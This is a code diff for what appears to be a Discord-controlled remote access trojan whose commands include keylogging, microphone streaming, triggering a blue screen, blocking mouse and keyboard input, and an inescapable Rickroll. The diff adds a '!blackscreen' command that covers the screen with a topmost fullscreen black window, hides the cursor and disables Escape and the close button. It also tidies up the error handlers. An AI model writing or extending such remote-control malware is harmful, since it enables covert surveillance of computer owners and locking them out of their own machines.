@@ -86,7 +86,7 @@ def in_correct_channel(ctx):
     sanitized_name = sanitize_channel_name(computer_name)
     return ctx.channel.name == sanitized_name
 
-async def send_temporary_message(ctx, content, duration=5):
+async def send_temporary_message(ctx, content, duration=10):
     message = await ctx.send(content)
     await asyncio.sleep(duration)
     await message.delete()
@@ -239,11 +239,17 @@ async def custom_help(ctx):
     `!bsod` - Triggers a Blue Screen of Death.
     `!rickroll` - ~you guessed it. It plays an Rickroll that is inescapable till the End.
     `!input <block/unblock>` - Completely blocks or unblocks the User Input, Mouse and Keyboard.
+    `!blackscreen <on/off>` - Makes the screen completely black and lets the Mice disappear.
     `!volume` - Shows volume information and available commands.
     `!volume <mute/unmute` - Mutes or unmutes the Device.
     `!volume <number from 1-100>` - Sets the Volume to a specific Percentage.
     """
     await ctx.send(help_text)
+    
+# Define the generic error handler function
+async def generic_command_error(ctx, error):
+    msg = await ctx.send(f"⚠️ An error occurred: {error}")
+    await msg.delete(delay=5)
     
 @bot.command()
 @commands.check(is_authorized)
@@ -826,6 +832,8 @@ async def keylog(ctx, action=None):
     else:
         await log_message(ctx, '❌ **Ungültige Aktion. Verwenden Sie `!keylog on` oder `!keylog off`.**', duration=10)
 
+keylog.error(generic_command_error)
+
 @bot.command()
 @commands.check(is_authorized)
 async def tts(ctx, *, message):
@@ -900,6 +908,8 @@ async def mic_stream_start(ctx):
     # Log messages (you can replace these with actual logging if needed)
     print(f"[{current_time()}] Connected to voice channel")
     print(f"[{current_time()}] Started playing audio from microphone's input")
+    
+mic_stream_start.error(generic_command_error)
 
 # Bot command to leave the voice channel
 @bot.command()
@@ -911,6 +921,8 @@ async def mic_stream_stop(ctx):
 
     await ctx.voice_client.disconnect()
     await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
+    
+mic_stream_stop.error(generic_command_error)
     
 # Function to block closing the window
 #def on_closing():
@@ -1023,14 +1035,9 @@ async def confirm_bsod(ctx):
     # Clear the pending confirmation
     confirmation_pending.pop(ctx.author.id, None)
 
-# Error handling
-@bsod.error
-async def bsod_error(ctx, error):
-    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+bsod.error(generic_command_error)
 
-@confirm_bsod.error
-async def confirm_bsod_error(ctx, error):
-    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+confirm_bsod.error(generic_command_error)
 
 input_blocked = False
 keyboard_listener = None
@@ -1082,12 +1089,8 @@ async def input_command(ctx, action: str):
         msg = await ctx.send("❌ Invalid action. Use `!input block` or `!input unblock`.")
         await msg.delete(delay=5)
 
-# Error handling
-@input_command.error
-async def input_command_error(ctx, error):
-    msg = await ctx.send(f"⚠️ An error occurred: {error}")
-    await msg.delete(delay=5)
-    
+input_command.error(generic_command_error)
+
 # Function to get the default audio device
 def get_default_audio_device():
     devices = AudioUtilities.GetSpeakers()
@@ -1142,11 +1145,67 @@ async def volume(ctx, *args):
         msg = await ctx.send("❌ **Error:** Invalid command. Use `!volume`, `!volume [0-100]`, `!volume mute`, or `!volume unmute`.")
         await msg.delete(delay=10)
 
-# Error handling
-@volume.error
-async def volume_command_error(ctx, error):
-    msg = await ctx.send(f"⚠️ **An error occurred:** {error}")
-    await msg.delete(delay=10)
+# Variable to store the black screen window
+black_screen_window = None
+
+# Function to turn on the black screen
+def blackscreen_on():
+    global black_screen_window
+    if black_screen_window is None:
+        black_screen_window = tk.Tk()
+        black_screen_window.attributes("-fullscreen", True)
+        black_screen_window.configure(bg="black")
+        black_screen_window.bind("<Escape>", lambda e: None)  # Disable Escape key
+        black_screen_window.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close button
+        black_screen_window.attributes("-topmost", True)  # Make sure the window is always on top
+        black_screen_window.config(cursor="none") 
+        black_screen_window.mainloop()
+
+# Function to turn off the black screen
+def blackscreen_off():
+    global black_screen_window
+    if black_screen_window is not None:
+        black_screen_window.destroy()
+        black_screen_window = None
+
+# Function to send a temporary message
+async def send_temporary_message(ctx, message, duration=10):
+    msg = await ctx.send(message)
+    await asyncio.sleep(duration)
+    await msg.delete()
+
+# Command to manage black screen
+@bot.command(name='blackscreen')
+@commands.check(is_authorized)
+async def blackscreen(ctx, action: str = None):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "This command can only be used in the specific channel for this PC.", duration=10)
+        return
+
+    if action is None:
+        await send_temporary_message(ctx, "❌ **Error:** No argument provided. Use `on` or `off`.", duration=10)
+        return
+    
+    if action.lower() == 'on':
+        if black_screen_window is not None:
+            await send_temporary_message(ctx, "❌ **Error:** The black screen is already on.", duration=10)
+        else:
+            turning_on_msg = await ctx.send("🖥️ **Turning on the black screen...**")
+            threading.Thread(target=blackscreen_on, daemon=True).start()
+            await turning_on_msg.delete()
+            await ctx.send("✅ **Black screen is now on.**")
+    elif action.lower() == 'off':
+        if black_screen_window is None:
+            await send_temporary_message(ctx, "❌ **Error:** The black screen is not on.", duration=10)
+        else:
+            turning_off_msg = await ctx.send("🖥️ **Turning off the black screen...**")
+            threading.Thread(target=blackscreen_off, daemon=True).start()
+            await turning_off_msg.delete()
+            await ctx.send("✅ **Black screen is now off.**")
+    else:
+        await send_temporary_message(ctx, "❌ **Error:** Invalid argument. Use `on` or `off`.", duration=10)
+
+blackscreen.error(generic_command_error)
 
 def main():
     time.sleep(15)
